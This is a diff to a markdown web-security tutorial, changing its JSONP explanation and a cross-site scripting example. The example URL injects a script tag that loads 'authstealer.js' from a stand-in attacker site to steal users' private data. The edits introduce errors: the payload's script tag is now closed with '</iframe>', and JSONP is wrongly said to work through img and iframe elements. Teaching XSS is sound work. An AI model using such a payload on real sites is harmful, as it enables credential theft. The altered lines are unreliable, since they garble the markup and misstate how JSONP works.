@@ -190,7 +190,7 @@ Origins must be carefully checked to prevent cross-site scripting.
 
 ### [**JSONP**](https://en.wikipedia.org/wiki/JSONP)
 
-**JSONP(JSON with Padding)** exploits the fact that `<script>` element is allowed to access cross domain data.
+**JSONP(JSON with Padding)** exploits the fact that HTML elements with `src` attribute (`<script>`, `<img>`, `<iframe>`) are allowed to access cross domain data.
 
 `<script>` element links to cross origin url.
 
@@ -282,7 +282,7 @@ http://bobssite.org?q=puppies%3Cscript%2520src%3D%22http%3A%2F%2Fmallorysevilsit
 Actual content:
 
 ```html
-http://bobssite.org?q=puppies<script%20src="http://mallorysevilsite.com/authstealer.js"></script>
+http://bobssite.org?q=puppies<script%20src="http://mallorysevilsite.com/authstealer.js"></iframe>
 ```
 
 If it's clicked  `<script>` tag gets injected and `authstrealer.js` runs to steal users' private information.
